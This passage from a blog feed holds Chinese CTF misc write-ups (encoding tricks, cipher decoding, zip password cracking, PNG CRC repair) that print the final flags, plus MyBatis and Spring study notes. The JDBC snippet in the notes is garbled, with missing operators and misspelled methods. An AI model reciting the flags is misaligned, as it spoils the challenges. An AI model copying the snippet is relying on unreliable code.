            "date_published": "2025-05-06T13:10:00.000Z",
            "content_html": "<h1 id=\"swpu2019伟大的侦探\"><a class=\"anchor\" href=\"#swpu2019伟大的侦探\">#</a> [SWPU2019] 伟大的侦探</h1>\n<p>解压不能全部解压，而且不能直接爆破，我们就可以看看解压了的文件，有个密码.txt，直接打开是乱码，010 打开也是乱码，但是</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505062112601.png\" alt=\"image-20250506211212495\" /></p>\n<p>像这样子换成 EDBCDIC 编码就可以看见解码密码了</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505062113492.png\" alt=\"image-20250506211316436\" /></p>\n<p>得到 misc 里面的内容：</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505062114266.png\" alt=\"image-20250506211435154\" /></p>\n<p>题目是伟大的侦探，和侦探有关系，可以想到福尔摩斯小人密码</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505062115459.png\" alt=\"image-20250506211536352\" /></p>\n<p>对比一下就好了</p>\n<pre><code>flag&#123;iloveholmesandwllm&#125;\n</code></pre>\n",
            "tags": [
                "misc",
                "010编码"
            ]
        },
        {
            "id": "http://odiws.github.io/2025/05/06/BUUCTF%EF%BC%9A%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD/",
            "url": "http://odiws.github.io/2025/05/06/BUUCTF%EF%BC%9A%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD/",
            "title": "BUUCTF：黑客帝国",
            "date_published": "2025-05-06T12:52:49.000Z",
            "content_html": "<h2 id=\"黑客帝国\"><a class=\"anchor\" href=\"#黑客帝国\">#</a> 黑客帝国</h2>\n<p>打开附件就是一个 txt 文件，</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505062054057.png\" alt=\"image-20250506205445935\" /></p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505062055348.png\" alt=\"image-20250506205508287\" /></p>\n<p>刚好是一样的</p>\n<p>就可以将这个内容写到一个 rar 文件中</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> binascii</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>hex_data <span class=\"token operator\">=</span> <span class=\"token string\">'文件内容'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>out <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'res.rar'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'wb'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>out<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>binascii<span class=\"token punctuation\">.</span>unhexlify<span class=\"token punctuation\">(</span>hex_data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>out<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>写到里面解压爆破密码是 3690：</p>\n<p>得到是一个 jpg 文件，010 查看：<br />\n<img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505062058016.png\" alt=\"image-20250506205824941\" /></p>\n<p>开头是 png，但是最后不是<img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505062058218.png\" alt=\"image-20250506205849184\" /></p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505062059969.png\" alt=\"image-20250506205904810\" /></p>\n<p>可以试试是不是 jpg 文件</p>\n<p>修改之前：</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505062101015.png\" alt=\"image-20250506210125888\" /></p>\n<p>修改之后：</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505062101552.png\" alt=\"image-20250506210102508\" /></p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505062101876.png\" alt=\"image-20250506210157623\" /></p>\n<pre><code>flag&#123;57cd4cfd4e07505b98048ca106132125&#125;\n</code></pre>\n",
            "tags": [
                "misc"
            ]
        },
        {
            "id": "http://odiws.github.io/2025/05/06/GXYCTF2019-gakki/",
            "url": "http://odiws.github.io/2025/05/06/GXYCTF2019-gakki/",
            "title": "[GXYCTF2019]gakki",
            "date_published": "2025-05-06T12:32:03.000Z",
            "content_html": "<h2 id=\"gxyctf2019gakki\"><a class=\"anchor\" href=\"#gxyctf2019gakki\">#</a> [GXYCTF2019]gakki</h2>\n<p>前面就是 foremost 分离，然后就是压缩包爆破密码，然后得到 flag.txt</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505062033736.png\" alt=\"image-20250506203349595\" /></p>\n<p>获得大量字符：</p>\n<p>想到字频解码脚本：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># -*- coding:utf-8 -*-</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">#Author: mochu7</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>alphabet <span class=\"token operator\">=</span> <span class=\"token string\">\"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&amp;*()_+- =\\\\&#123;\\\\&#125;[]\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>strings <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'./flag.txt'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>result <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> alphabet<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\tcounts <span class=\"token operator\">=</span> strings<span class=\"token punctuation\">.</span>count<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\ti <span class=\"token operator\">=</span> <span class=\"token string\">'&#123;0&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\tresult<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> counts</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>res <span class=\"token operator\">=</span> <span class=\"token builtin\">sorted</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">.</span>items<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>key<span class=\"token operator\">=</span><span class=\"token keyword\">lambda</span> item<span class=\"token punctuation\">:</span>item<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>reverse<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">for</span> data <span class=\"token keyword\">in</span> res<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> res<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\tflag <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>end<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505062038576.png\" alt=\"image-20250506203856465\" /></p>\n",
            "tags": [
                "misc",
                "字频统计"
            ]
        },
        {
            "id": "http://odiws.github.io/2025/05/06/MRCTF2020-ezmisc/",
            "url": "http://odiws.github.io/2025/05/06/MRCTF2020-ezmisc/",
            "title": "[MRCTF2020]ezmisc",
            "date_published": "2025-05-06T12:21:00.000Z",
            "content_html": "<h2 id=\"mrctf2020ezmisc\"><a class=\"anchor\" href=\"#mrctf2020ezmisc\">#</a> [MRCTF2020]ezmisc</h2>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505062022926.png\" alt=\"image-20250506202221806\" /></p>\n<p>放进 010 看一下</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505062023436.png\" alt=\"image-20250506202324305\" /></p>\n<p>有这个 CRC 的问题提示：<br />\n修改宽高：</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505062024262.png\" alt=\"image-20250506202424168\" /></p>\n<p>【</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505062024797.png\" alt=\"image-20250506202432709\" /></p>\n<pre><code>flag&#123;1ts_vEryyyyyy_ez!&#125;\n</code></pre>\n",
            "tags": [
                "misc",
                "CRC"
            ]
        },
        {
            "id": "http://odiws.github.io/2025/05/06/SWPU2019-%E6%88%91%E6%9C%89%E4%B8%80%E5%8F%AA%E9%A9%AC%E9%87%8C%E5%A5%A5/",
            "url": "http://odiws.github.io/2025/05/06/SWPU2019-%E6%88%91%E6%9C%89%E4%B8%80%E5%8F%AA%E9%A9%AC%E9%87%8C%E5%A5%A5/",
            "title": "[SWPU2019]我有一只马里奥",
            "date_published": "2025-05-06T12:15:23.000Z",
            "content_html": "<h2 id=\"swpu2019我有一只马里奥\"><a class=\"anchor\" href=\"#swpu2019我有一只马里奥\">#</a> [SWPU2019] 我有一只马里奥</h2>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505062017708.png\" alt=\"image-20250506201700538\" /></p>\n",
            "tags": [
                "misc",
                "NTFs数据流"
            ]
        },
        {
            "id": "http://odiws.github.io/2025/04/23/Spring-MVC/",
            "url": "http://odiws.github.io/2025/04/23/Spring-MVC/",
            "title": "Spring_MVC",
            "date_published": "2025-04-23T04:49:51.000Z",
            "content_html": "",
            "tags": []
        },
        {
            "id": "http://odiws.github.io/2025/04/17/MyBatis/",
            "url": "http://odiws.github.io/2025/04/17/MyBatis/",
            "title": "MyBatis",
            "date_published": "2025-04-17T12:49:14.000Z",
            "content_html": "<h2 id=\"mybatis\"><a class=\"anchor\" href=\"#mybatis\">#</a> mybatis</h2>\n<p>&lt;u&gt; 什么是 MyBatis?&lt;/u&gt;<br />\nM 小 yBatis 是一款优秀的<strong>持久层</strong><strong><strong>框架</strong></strong>，用于 &lt;u&gt;<strong> 简化 JDBC 开发</strong> &lt;/u&gt;<br />\nMyBatis 本是 Apache 的一个开源项目 iBatis,201O 年这个项目由 apache software<br />\nfoundation 迁移到了 google code, 并且改名为 MyBatis。2013 年 11 月迁移到 Github</p>\n<pre><code>官网：https://mybatis.org/mybatis-3/zh_CN/getting-started.html\n</code></pre>\n<p><strong>持久层</strong></p>\n<p>负责将数据到保存到数据库的那一层代码</p>\n<p>javaEE 三层架构：<strong>表现层，业务层，持久层</strong></p>\n<p><strong>框架</strong></p>\n<p>框架就是一个半成品软件，是一套客场虫蛹的，通用的，如阿健基础代码模型</p>\n<p>在框架的基础之上构建软件编写更加高效，规范，通用，可扩展</p>\n<p>JDBC 缺点：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"><span>a</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">1.</span>注册驱动</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token class-name\">Class</span><span class=\"token punctuation\">.</span><span class=\"token function\">forName</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"com.mysql.jdbc.Driver\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">/</span><span class=\"token number\">2.</span>获取<span class=\"token class-name\">Connection</span>连接</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token class-name\">String</span> url <span class=\"token string\">\"jdbc:mysql:///db1?useSSL=false\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token class-name\">String</span> uname<span class=\"token operator\">=</span>“root\"<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token class-name\">String</span> pwd <span class=\"token operator\">=</span><span class=\"token string\">\"1234\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token class-name\">Connection</span> conn <span class=\"token class-name\">DriverManager</span><span class=\"token punctuation\">.</span><span class=\"token function\">getConnection</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span>uname<span class=\"token punctuation\">,</span>pwd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>∥接收输入的查询条件</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token class-name\">String</span> gender<span class=\"token operator\">=</span><span class=\"token string\">\"男\"</span>；</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>∥定义sql</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token class-name\">String</span> sql <span class=\"token operator\">=</span><span class=\"token string\">\"select from tb_user where gender ?\"</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>∥获取ostmt对象</pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token class-name\">PreparedStatement</span> pstmt conn<span class=\"token punctuation\">.</span><span class=\"token function\">prepareStatement</span><span class=\"token punctuation\">(</span>sql<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>∥设置？的值</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>pstmt<span class=\"token punctuation\">.</span><span class=\"token function\">setString</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>gender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>∥执行sql</pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token class-name\">ResultSet</span> rs pstmt<span class=\"token punctuation\">.</span><span class=\"token function\">executeQuery</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>∥遍历<span class=\"token class-name\">Result</span><span class=\"token punctuation\">,</span>获取数据</pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token class-name\">User</span> user <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token class-name\">ArrayList</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">User</span><span class=\"token punctuation\">></span></span>users <span class=\"token keyword\">new</span> <span class=\"token class-name\">ArrayList</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>rs<span class=\"token punctuation\">.</span><span class=\"token function\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>∥获取数据</pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">int</span> id rs<span class=\"token punctuation\">.</span><span class=\"token function\">getlnt</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"id\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token class-name\">String</span> username rs<span class=\"token punctuation\">.</span><span class=\"token function\">getString</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"username\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token class-name\">String</span> password rs<span class=\"token punctuation\">.</span><span class=\"token function\">getString</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"password\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>∥创建对象，设置属性值</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>user <span class=\"token keyword\">new</span> <span class=\"token class-name\">User</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>user<span class=\"token punctuation\">.</span><span class=\"token function\">setld</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>user<span class=\"token punctuation\">.</span><span class=\"token function\">setUsername</span><span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>user<span class=\"token punctuation\">.</span><span class=\"token function\">setPassword</span><span class=\"token punctuation\">(</span>password<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>user<span class=\"token punctuation\">.</span><span class=\"token function\">setGender</span><span class=\"token punctuation\">(</span>gender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>∥装入集合</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>users<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>user<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>1. 硬编码</p>\n<p>需要改代码（密码账户修改，数据库也要改代码，SQL 语句）</p>\n<p>2. 操作繁琐</p>\n<p>手动设置参数</p>\n<p>手动封装结果集</p>\n<h4 id=\"mybatis简化\"><a class=\"anchor\" href=\"#mybatis简化\">#</a> MyBatis 简化：</h4>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202504172110196.png\" alt=\"image-20250417211043905\" /></p>\n<h4 id=\"快速入门\"><a class=\"anchor\" href=\"#快速入门\">#</a> 快速入门：</h4>\n<p>查询 user 表中的所有数据</p>\n<p>1. 创建 user 表，添加数据</p>\n<p>2. 创建模块，导入坐标</p>\n<p>3. 编写 MyBatis 核心配置文件 --》替换连接信息，解决硬编码问题</p>\n<p>4. 编写 SQL 映射文件  --》统一管理 SQL 语句，解决硬编码问题</p>\n<p>5. 编码</p>\n<p>​      1. 定义 POJO 类</p>\n<p>​      2. 加载核心配置文件，获取 SqlSessionFactory 对象</p>\n<p>​      3. 获取 SqlSession 对象，执行 SQL 语句</p>\n<p>​      4. 释放资源</p>\n",
            "tags": []
        },
        {
            "id": "http://odiws.github.io/2025/04/17/springweb/",
            "url": "http://odiws.github.io/2025/04/17/springweb/",
            "title": "springweb",
            "date_published": "2025-04-17T12:43:47.000Z",
            "content_html": "<h2 id=\"springweb开发学习笔记\"><a class=\"anchor\" href=\"#springweb开发学习笔记\">#</a> Springweb 开发学习笔记</h2>\n<p>为什么要学习？</p>\n<p>简化开发；框架整合</p>\n<p>学什么？</p>\n<p>简化开发：</p>\n<p>IOC</p>\n<p>AOP-----&gt; 事务处理</p>\n<p>框架整合：</p>\n<p>MyBatis</p>\n<p>Mybatis-plus</p>\n",
            "tags": []
        },
        {
            "id": "http://odiws.github.io/2025/04/14/springboot-web/",
            "url": "http://odiws.github.io/2025/04/14/springboot-web/",
            "title": "springboot_web",
            "date_published": "2025-04-14T14:35:49.000Z",
            "content_html": "<h2 id=\"用springboot开发简单的网站\"><a class=\"anchor\" href=\"#用springboot开发简单的网站\">#</a> 用 SpringBoot 开发简单的网站</h2>\n<p>springboot 到底帮我们配置了什么？我们能不能进行修改？能修改什么东西？能不能扩展？</p>\n<p>xxxxAutoConfiguration.. 向容器中自动配置组件</p>\n<p>xxxxProperties: 自动配置类，装配配置文件中自定义的一些内容</p>\n<p>要解决的问题：</p>\n<p>导入静态资源.......</p>\n<p>首页</p>\n<p>jsp，模板引擎 Thymelef</p>\n<p>装配扩展 SpringMVC</p>\n<p>增删改查</p>\n<p>拦截器</p>\n<table>\n<thead>\n<tr>\n<th>目录名称</th>\n<th>作用说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>config</strong></td>\n<td>配置类，放 Spring 配置、跨域配置、WebSocket 配置、安全配置等。</td>\n</tr>\n<tr>\n<td><strong>controller</strong></td>\n<td>控制层，负责接收前端请求，调用 service，返回数据或视图。</td>\n</tr>\n<tr>\n<td><strong>service</strong></td>\n<td>业务逻辑层，处理具体的业务操作。通常是 controller 调用它。</td>\n</tr>\n<tr>\n<td><strong>model/entity</strong></td>\n<td>实体类，对应数据库表的字段结构。</td>\n</tr>\n<tr>\n<td><strong>repository/dao</strong></td>\n<td>数据访问层，用来操作数据库，一般继承  <code>JpaRepository</code>  或  <code>CrudRepository</code> 。</td>\n</tr>\n<tr>\n<td><strong>utils</strong></td>\n<td>工具类，比如日期处理、字符串处理、JWT 工具等。</td>\n</tr>\n</tbody>\n</table>\n<hr />\n<h3 id=\"srcmainresources\"><a class=\"anchor\" href=\"#srcmainresources\">#</a> 📁  <code>src/main/resources</code></h3>\n<p>这是 Spring Boot 的资源文件目录。</p>\n<table>\n<thead>\n<tr>\n<th>文件 / 目录</th>\n<th>作用说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>application.properties / application.yml</strong></td>\n<td>配置文件，比如端口、数据库、日志、缓存等配置。</td>\n</tr>\n<tr>\n<td><strong>templates/</strong></td>\n<td>放 Thymeleaf 或 Freemarker 的 HTML 模板页面（必须要放在这儿才能渲染页面）。</td>\n</tr>\n<tr>\n<td><strong>static/</strong></td>\n<td>放静态资源：CSS、JS、图片（这些不会被 Spring MVC 拦截，直接访问）。</td>\n</tr>\n<tr>\n<td><strong>public/</strong></td>\n<td>也可以放静态资源，效果和 static 一样。</td>\n</tr>\n<tr>\n<td><strong>banner.txt</strong></td>\n<td>启动 Spring Boot 时控制台打印的图标，可以自定义。</td>\n</tr>\n</tbody>\n</table>\n<hr />\n<h3 id=\"srctestjava\"><a class=\"anchor\" href=\"#srctestjava\">#</a> 📁  <code>src/test/java</code></h3>\n<p>写单元测试的地方，比如使用 JUnit、Mockito 写服务层、控制器的测试。</p>\n<hr />\n<h3 id=\"target\"><a class=\"anchor\" href=\"#target\">#</a> 📁  <code>target/</code></h3>\n<p>Maven 或 Gradle 构建后生成的文件目录，<strong>不用手动修改</strong>。打包后的  <code>.jar</code>  文件也在这里。</p>\n<hr />\n<h3 id=\"项目根目录下的文件\"><a class=\"anchor\" href=\"#项目根目录下的文件\">#</a> 📄 项目根目录下的文件</h3>\n<table>\n<thead>\n<tr>\n<th>文件名</th>\n<th>作用</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>pom.xml</strong></td>\n<td>Maven 项目的依赖管理文件，添加第三方库就靠它。</td>\n</tr>\n<tr>\n<td><strong>build.gradle</strong></td>\n<td>如果你用 Gradle 管理项目，则是用这个文件。</td>\n</tr>\n<tr>\n<td><strong>.gitignore</strong></td>\n<td>忽略不需要 Git 提交的文件，比如  <code>target/</code> 、 <code>.idea/</code> 。</td>\n</tr>\n<tr>\n<td><strong><span class=\"exturl\" data-url=\"aHR0cDovL1JFQURNRS5tZA==\">README.md</span></strong></td>\n<td>项目说明文档。</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"静态资源\"><a class=\"anchor\" href=\"#静态资源\">#</a> 、静态资源</h3>\n<p>直接全局搜索：</p>\n<pre><code>WebMvcAutoConfigguration.class(自动配置类)\n</code></pre>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202504151917480.png\" alt=\"image-20250415191709161\" /></p>\n<pre><code>WebMvcAutoConfigurationAdapter\n</code></pre>\n<p>在这个类里面找到 addResourceHandlers 这个增加资源处理器类</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">addResourceHandlers</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ResourceHandlerRegistry</span> registry<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>resourceProperties<span class=\"token punctuation\">.</span><span class=\"token function\">isAddMappings</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>logger<span class=\"token punctuation\">.</span><span class=\"token function\">debug</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Default resource handling disabled\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">addResourceHandler</span><span class=\"token punctuation\">(</span>registry<span class=\"token punctuation\">,</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>mvcProperties<span class=\"token punctuation\">.</span><span class=\"token function\">getWebjarsPathPattern</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"classpath:/META-INF/resources/webjars/\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">addResourceHandler</span><span class=\"token punctuation\">(</span>registry<span class=\"token punctuation\">,</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>mvcProperties<span class=\"token punctuation\">.</span><span class=\"token function\">getStaticPathPattern</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>registration<span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span> <span class=\"token punctuation\">&#123;</span> registration<span class=\"token punctuation\">.</span><span class=\"token function\">addResourceLocations</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>resourceProperties<span class=\"token punctuation\">.</span><span class=\"token function\">getStaticLocations</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>servletContext <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span><span class=\"token class-name\">ServletContextResource</span> resource <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ServletContextResource</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>servletContext<span class=\"token punctuation\">,</span> <span class=\"token string\">\"/\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>     registration<span class=\"token punctuation\">.</span><span class=\"token function\">addResourceLocations</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Resource</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span>resource<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202504151922093.png\" alt=\"image-20250415192249014\" /></p>\n<p>找到静态资源 path</p>\n<figure class=\"highlight 